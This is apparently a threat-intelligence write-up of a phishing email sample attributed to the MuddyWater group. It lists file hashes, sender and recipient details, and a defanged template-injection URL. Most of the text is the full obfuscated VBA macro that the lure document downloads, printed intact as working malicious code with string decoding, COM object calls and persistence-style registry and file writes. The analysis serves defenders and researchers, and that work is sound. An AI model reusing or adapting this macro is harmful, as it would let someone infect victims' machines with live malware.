sha256 : **aed6637aa6d59df253ab2dca749b83561fef03257b069876c8644167f4d7f1a9**

ITW Filename : **Students Migration Verification - Civil Status and passport Department.msg**

If we were to analyse the meta data of the .msg file, we can see that it's sent on the **2019-04-08**

We can see that the attacker abusing the mail server from **gju.edu.jo**

We can also see the original email is sent from as **supplies cspd. <supplies@cspd.gov.jo>** and sent to **recruit@hansung.co.kr**

The subject of the email is **Students Migration Verification - Civil Status and passport Department**

![Email](../images/aed6637aa6d59df253ab2dca749b83561fef03257b069876c8644167f4d7f1a9_0001.png)

Inside the .msg file, there is a malicious docx file, **Unistudent_SocialID.docx**

The sha256 of **Unistudent_SocialID.docx** is **dab2cd3ddfe29a89b3d80830c6a4950952a44b6c97a664f1e9c182318ae5f4da**

The .docx file uses Template Injection to download and execute the macros in **hxxp://tfu[.]ae/README.txt**

The sha256 of **README.txt** is **0ae4ce8c511a22da99c6edc4be86af1c5d3a7d2baf1e862925a503d8baae9fd7**

```vb
Function eage()
    Set hetx = Application
    Set vvtb = CallByName(hetx, eyak("0" & lssa & "341341" & doxx & "34" & vdvk & "1" & cgik & "29" & vdvk & ""), pohk)
    CallByName vvtb, eyak("0" & rump & "300" & lssa & "" & pxtq & "" & tqjf & "33" & vdvk & ""), VbMethod, eyak("0" & rump & "30" & wewy & "13" & csvd & "81" & tqjf & "291" & ejlw & "5108813" & cdmi & "31" & cbqh & "33"), eyak("10" & cwlr & "" & cwlr & "00511" & opkp & "30" & wewy & "13" & csvd & "81" & tqjf & "291" & ejlw & "51" & bozr & "1" & tqjf & "3" & cdmi & "41" & doxx & "" & cbqh & "290511" & doxx & "3405" & acdc & "" & lrwf & "01" & ejlw & "51" & wewy & "1" & cbqh & "2813111" & pxev & "" & uqbt & "41" & nrqk & "" & pxtq & "2005" & shjn & "81" & doxx & "3" & uqbt & "305" & shjn & "" & uqbt & "" & cwlr & "413405" & shjn & "81" & cbqh & "33" & qqiw & "05" & shjn & "012" & acdc & "" & acdc & "4" & wewy & "" & dpen & "051" & bozr & "1" & tqjf & "3" & cdmi & "41" & doxx & "" & cbqh & "29"), 0, 1, 0, 0, 0
End Function
Function pmxv()
    Dim hetx, vvtb As String
    Set bbia = Application
    ezuw = CallByName(bbia, eyak("10" & uqbt & "013" & cdmi & "41" & doxx & "" & cbqh & "29"), pohk)
    hetx = eyak("" & djwa & "1" & cbqh & "21" & vdvk & "13811" & pxev & "" & cwlr & "011109" & csvd & "4" & wewy & "1" & hbnk & "" & cbqh & "341" & cbqh & "21" & vdvk & "11109812" & acdc & "" & acdc & "4" & wewy & "1" & tqjf & "11") & ezuw & eyak("111088139" & wewy & "1" & tqjf & "" & pxtq & "11" & djwa & "" & dpen & "" & wewy & "13" & pxev & "" & cwlr & "4" & vdvk & "140")
    vvtb = eyak("084" & wewy & "" & wewy & "1" & tqjf & "3413410" & ldxy & "5098096")
    Set jxpd = liha(eyak("1381" & doxx & "29128122128" & vdvk & "1340771421" & doxx & "2813" & acdc & "013" & cdmi & "41" & cbqh & "2" & ksch & "" & pxev & "" & uqbt & "41" & cbqh & "2909" & uqbt & "0" & bozr & "1" & tqjf & "270801" & doxx & "2813" & acdc & "013" & cdmi & "41" & cbqh & "2" & ksch & "" & pxev & "" & uqbt & "014405211111" & jaic & "511" & shjn & "31" & cbqh & "30" & vdvk & "1111" & opkp & "" & tqjf & "2111" & pxev & "61" & pxtq & "" & ejlw & "77" & djwa & "" & vdvk & "1" & opkp & "0" & acdc & "012209" & lrwf & "3" & lvzg & "" & bozr & ""))
    CallByName jxpd, eyak("" & djwa & "1" & tqjf & "" & ejlw & "" & rump & "06098101087" & dpwa & "1" & cgik & "" & pxtq & "3" & csvd & "0"), VbMethod, &H80000001, hetx, vvtb, 1

End Function

Function liha(hetx As String) As Object
    Set liha = GetObject(hetx)
End Function

Function eyak(vvtb As String) As String
    Dim hetx As String
    hetx = ""
    Do
        hetx = hetx + ocfg(yyor(vvtb))
        vvtb = omss(vvtb)
    Loop While Len(vvtb) > 0
    eyak = hetx
End Function

Function ocfg(vvtb)
    ocfg = Chr(vvtb - 19)
End Function
Function yyor(vvtb)
    yyor = Left(vvtb, 3)
End Function
Function omss(vvtb)
    omss = Right(vvtb, Len(vvtb) - 3)
End Function

Function wxbl()

    Do While True
    On Error GoTo Handler
    Dim hetx, vvtb As Object
    

    Set hetx = ocag(eyak("0" & "8" & "8" & "1" & "3" & "9" & wewy & "1" & tqjf & "2" & "7" & "0" & "6" & ldxy & "4" & "1" & "3" & shjn & "" & acdc & "" & emas & "4" & wewy & "1" & "1" & pxev & "" & uqbt & "4" & "1" & cbqh & "2" & "9"))

    CallByName hetx, eyak("1" & "0" & uqbt & "4" & "1" & "3" & "4" & "1" & doxx & "" & nrqk & "" & pxtq & "2" & "0"), hjje, lguy
    CallByName hetx, eyak("0" & rump & "" & doxx & "3" & "4" & "1" & "3" & acdc & "71" & cgik & "4" & "00" & lssa & "" & pxtq & "" & tqjf & "3" & "3" & vdvk & "1" & "3" & "4"), hjje, lguy
    Set bbia = CallByName(hetx, eyak("1" & "0" & pxev & "0" & "1" & "3" & cwlr & "6" & "1" & nrqk & "" & cbqh & "" & cbqh & "2" & pxev & "4"), pohk)
    Set vvtb = CallByName(bbia, eyak("0" & lssa & "" & opkp & "1" & "9"), pohk)
    Set ezuw = CallByName(hetx, eyak("0" & "8" & "4" & wewy & "1" & "3" & uqbt & "4" & bozr & "1" & tqjf & "0" & pxev & "0" & "1" & "3" & cwlr & "6" & "1" & nrqk & "" & cbqh & "3" & "0" & wfoz & ""), pohk)
    bxap = CallByName(ezuw, eyak("0" & "9" & "7" & "1" & cgik & "2" & "8" & dpen & ""), pohk)
    Set jxpd = CallByName(vvtb, eyak("1" & "0" & ldxy & "5" & "0" & "9" & lrwf & "31" & cbqh & "2" & uqbt & "0" & wewy & "" & vdvk & ""), pohk)
    Set rsry = CallByName(jxpd, eyak("1" & "0" & ldxy & "" & ldxy & "" & pxev & "0" & "1" & "2" & "8" & "1" & "3" & shjn & "01291" & tqjf & "29" & vdvk & "1" & "3" & "4"), pohk)
    Set snbm = CallByName(rsry(1), eyak("0" & "8" & pxev & "01" & opkp & "2" & "00" & "9" & pxev & "01" & opkp & "361" & pxtq & "20"), pohk)
    
    aaaaaaaaa = uuuu1.ttt1.Text & eyak(uuuu1.ttt2.Text)
    CallByName snbm, eyak("0" & lssa & "" & opkp & "1908" & lrwf & "31" & cbqh & "28" & djwa & "" & vdvk & "13" & cwlr & "4129122"), VbMethod, aaaaaaaaa
    CallByName hetx, eyak("10" & shjn & "" & csvd & "9"), VbMethod, bxap & eyak("05210" & cwlr & "" & cwlr & "413410" & pxev & "013" & cwlr & "61" & nrqk & "" & cbqh & "30" & wfoz & "06" & uqbt & "0")
    GoTo nnt
    
Handler:

    Loop
    
nnt:
End Function

Function saqu(hetx)
    saqu = CStr(hetx)
End Function

Function pohk()
    pohk = VbGet
End Function

Function hjje()
    hjje = VbLet
End Function

Function lguy() As Boolean
    lguy = False
End Function

Function ocag(hetx As String) As Object
    Set ocag = CreateObject(hetx)
End Function


Function wewy()
    wewy = saqu(118)
End Function


Function uqbt()
    uqbt = saqu(512)
End Function


Function cwlr()
    cwlr = saqu(312)
End Function


Function ejlw()
    ejlw = saqu(350)
End Function


Function doxx()
    doxx = saqu(241)
End Function


Function vdvk()
    vdvk = saqu(135)
End Function


Function bozr()
    bozr = saqu(137)
End Function


Function ldxy()
    ldxy = saqu(508)
End Function


Function ewcy()
    ewcy = saqu(351)
End Function


Function dpwa()
    dpwa = saqu(105)
End Function


Function opkp()
    opkp = saqu(191)
End Function


Function nrqk()
    nrqk = saqu(171)
End Function


Function rump()
    rump = saqu(871)
End Function


Function lrwf()
    lrwf = saqu(913)
End Function


Function djwa()
    djwa = saqu(102)
End Function


Function pxev()
    pxev = saqu(613)
End Function


Function lssa()
    lssa = saqu(841)
End Function


Function jaic()
    jaic = saqu(106)
End Function


Function wfoz()
    wfoz = saqu(126)
End Function


Function qqiw()
    qqiw = saqu(119)
End Function


Function shjn()
    shjn = saqu(113)
End Function


Function acdc()
    acdc = saqu(112)
End Function


Function cbqh()
    cbqh = saqu(301)
End Function


Function cgik()
    cgik = saqu(161)
End Function


Function pxtq()
    pxtq = saqu(271)
End Function


Function emas()
    emas = saqu(712)
End Function


Function tqjf()
    tqjf = saqu(201)
End Function


Function lvzg()
    lvzg = saqu(130)
End Function


Function cdmi()
    cdmi = saqu(313)
End Function


Function acml()
    acml = saqu(411)
End Function


Function csvd()
    csvd = saqu(612)
End Function


Function ksch()
    ksch = saqu(911)
End Function


Function lkoc()
    lkoc = saqu(513)
End Function


Function dpen()
    dpen = saqu(120)
End Function


Function hbnk()
    hbnk = saqu(331)
End Function
```

This is **MuddyWater**
